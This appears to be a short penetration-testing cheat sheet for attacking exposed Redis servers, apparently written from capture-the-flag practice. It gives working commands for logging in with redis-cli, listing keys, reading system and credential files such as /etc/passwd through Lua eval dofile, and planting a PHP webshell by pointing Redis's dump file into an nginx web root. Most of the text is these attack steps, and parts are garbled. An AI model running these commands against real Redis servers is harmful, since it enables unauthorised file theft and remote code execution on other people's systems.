Redis
Redis is an open source, in-memory data structure store, used as a database, cache and message broker.
If redis is open and we have its credential we can login from cli

    redis-cli -h $ip -a 'password'

-NOAUTH command to check if authorization is required or not

    keys * (this command list the dbcontents)

    lrange db_keyname 1 100 (if type command doesnt display the contents )

    Enumerating files
    eval dofile("/etc/passwd") 0
    eval "dofile('c:\\users\\path')" 0

    dumping redid db file
    eval dofile('/var/data/app/db.conf');return(db.password); 0

Getting rce through redis
we can get webshell through redis if we have write access to a directory whithin web root or accessible by some other means

    nc -nv $ip port

10.85.0.52:6379> config set dir /usr/share/nginx/html OK 10.85.0.52:6379> config set dbfilename redis.php OK 10.85.0.52:6379> set test "" # Our code goes here OK 10.85.0.52:6379> save OK

Or the eval dofile allows us to read system sensitive files via redis

redis-cli -h 10.10.188.12 -p 6379 eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0

we can also use netcat to connect to redis

    nc $ip port
